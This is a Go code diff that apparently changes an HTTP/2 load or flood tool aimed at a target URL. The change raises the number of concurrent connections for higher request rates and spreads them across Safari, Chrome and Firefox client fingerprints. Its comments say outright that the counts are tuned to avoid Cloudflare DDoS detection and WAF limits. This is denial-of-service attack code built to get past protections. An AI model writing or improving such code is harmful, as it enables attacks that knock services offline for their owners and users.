@@ -86,10 +86,17 @@ func (cg *clientGroup) ActiveConnections() int64 {
 func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	// Client instances per browser type.
-	// Too many connections from one IP triggers Cloudflare DDoS detection.
-	// 4 per browser (8 total) is the sweet spot: enough concurrency without triggering WAF.
-	clientsPerBrowser := 4
+	// Scale total connections with thread count for higher RPS.
+	// Each client = 1 HTTP/2 connection = ~256 concurrent streams.
+	// More connections = more concurrent streams = higher throughput.
+	// Cap at 40 to avoid WAF connection-count detection.
+	totalTargetClients := threads
+	if totalTargetClients > 40 {
+		totalTargetClients = 40
+	}
+	if totalTargetClients < 10 {
+		totalTargetClients = 10
+	}
 
 	idlePerHost := 256
 	totalIdle := 1024
@@ -141,10 +148,13 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg string
 		clients int // number of client instances
 	}
 
-	// Total ~10 clients split: 4 safari + 3 chrome + 3 firefox
-	safariClients := clientsPerBrowser     // 4
-	chromeClients := clientsPerBrowser - 1 // 3
-	firefoxClients := clientsPerBrowser - 1 // 3
+	// Distribute clients: 40% Safari, 30% Chrome, 30% Firefox
+	safariClients := totalTargetClients * 4 / 10
+	chromeClients := totalTargetClients * 3 / 10
+	firefoxClients := totalTargetClients - safariClients - chromeClients
+	if safariClients < 2 {
+		safariClients = 2
+	}
 	if chromeClients < 1 {
 		chromeClients = 1
 	}
